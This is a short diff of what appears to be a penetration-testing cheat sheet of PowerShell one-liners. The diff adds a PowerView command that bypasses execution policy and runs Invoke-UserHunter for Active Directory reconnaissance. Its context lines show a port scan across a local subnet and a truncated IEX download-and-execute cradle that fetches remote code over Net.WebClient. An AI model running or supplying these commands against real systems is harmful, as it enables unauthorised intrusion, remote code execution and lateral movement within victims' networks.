@@ -51,3 +51,6 @@ powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadStri
 //
 Invoke-PortScan -StarAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost
 //
+//PowerView
+powershell.exe -exec bypass -Command "& (Import-Module c:\PowerView.ps1; Invoke-UserHunter)"
+//
